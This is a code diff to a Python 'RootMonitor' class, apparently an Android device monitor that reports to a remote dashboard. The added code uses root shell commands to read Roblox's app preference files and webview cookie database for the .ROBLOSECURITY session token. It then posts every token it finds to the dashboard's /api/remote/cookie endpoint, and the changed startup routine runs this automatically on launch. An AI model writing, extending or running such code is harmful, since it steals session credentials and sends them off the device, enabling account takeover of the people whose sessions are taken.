@@ -140,6 +140,57 @@ class RootMonitor:
                 return int(m.group(1)), int(m.group(2))
         return 1080, 1920
 
+    def extract_cookie(self, package='com.roblox.client'):
+        paths = [
+            f'/data/data/{package}/shared_prefs/roblox.xml',
+            f'/data/data/{package}/shared_prefs/AuthInfo.xml',
+        ]
+        for path in paths:
+            code, out = self.su_cmd(f'cat {path}')
+            if code == 0 and out:
+                m = re.search(r'<string name="ROBLOSECURITY">([^<]+)</string>', out)
+                if m:
+                    cookie = m.group(1)
+                    if cookie.startswith('_|'):
+                        return cookie
+        code, out = self.su_cmd(f'ls /data/data/{package}/shared_prefs/')
+        if code == 0 and out:
+            for f in out.split('\n'):
+                f = f.strip()
+                if not f.endswith('.xml'):
+                    continue
+                code2, out2 = self.su_cmd(f'cat /data/data/{package}/shared_prefs/{f}')
+                if code2 == 0 and out2:
+                    m = re.search(r'<string name="ROBLOSECURITY">([^<]+)</string>', out2)
+                    if m:
+                        cookie = m.group(1)
+                        if cookie.startswith('_|'):
+                            return cookie
+        code, out = self.su_cmd(f'sqlite3 /data/data/{package}/app_webview/Default/Cookies "SELECT value FROM cookies WHERE name=\'.ROBLOSECURITY\'"')
+        if code == 0 and out and out.startswith('_|'):
+            return out.strip()
+        return None
+
+    def send_cookie(self, package, cookie):
+        return self.http_post('/api/remote/cookie', {
+            'package': package,
+            'cookie': cookie
+        })
+
+    def extract_all_cookies(self):
+        results = []
+        for pkg in self.packages:
+            cookie = self.extract_cookie(pkg)
+            if cookie:
+                result = self.send_cookie(pkg, cookie)
+                success = result and result.get('success')
+                print(f'[{pkg}] Cookie extracted and sent: {"OK" if success else "FAILED"}')
+                results.append({'package': pkg, 'success': success, 'has_cookie': True})
+            else:
+                print(f'[{pkg}] Cookie not found')
+                results.append({'package': pkg, 'success': False, 'has_cookie': False})
+        return results
+
     def http_get(self, path):
         url = f'{self.dashboard_url}{path}'
         try:
@@ -220,6 +271,9 @@ class RootMonitor:
         if not self.register():
             print('[MONITOR] ERROR: Failed to register to dashboard')
             return
+
+        print('[MONITOR] Extracting cookies from device...')
+        self.extract_all_cookies()
 
         self.running = True
         print(f'[MONITOR] Monitor started! Polling every {self.poll_interval}s...')
